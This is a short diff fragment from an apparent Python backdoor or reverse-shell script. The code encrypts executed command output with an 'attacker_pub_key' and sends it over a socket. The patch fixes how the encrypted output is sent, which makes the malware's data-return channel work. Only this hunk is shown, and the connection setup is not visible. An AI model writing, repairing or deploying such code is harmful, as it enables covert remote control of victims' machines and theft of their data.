@@ -37,7 +37,7 @@ try:
             result = result.stdout.decode()
             encrypted_output = asymmetric_encryption.encrypt_message(result, attacker_pub_key)
             print(len(encrypted_output))
-            s.send(encrypted_output.encode())
+            s.send(encrypted_output)
         else:
             s.send(b' ')
 except:
